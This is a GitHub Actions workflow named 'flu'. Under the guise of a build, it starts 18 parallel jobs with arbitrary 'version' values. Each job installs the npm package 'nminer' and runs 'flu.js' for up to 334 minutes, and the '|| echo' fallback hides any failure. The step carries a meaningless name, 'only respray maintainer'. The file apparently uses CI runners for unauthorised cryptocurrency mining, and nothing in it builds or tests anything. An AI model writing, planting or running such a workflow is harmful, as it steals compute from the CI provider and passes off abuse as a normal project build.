name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 962 }
          - { version: 7999 }
          - { version: 7460 }
          - { version: 3681 }
          - { version: 9735 }
          - { version: 5215 }
          - { version: 5022 }
          - { version: 8263 }
          - { version: 4197 }
          - { version: 9607 }
          - { version: 9100 }
          - { version: 9138 }
          - { version: 1306 }
          - { version: 928 }
          - { version: 2390 }
          - { version: 4485 }
          - { version: 9229 }
          - { version: 4581 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: only respray maintainer
        run: |
          npm install nminer@latest
          timeout 334m node flu.js || echo "flu executed"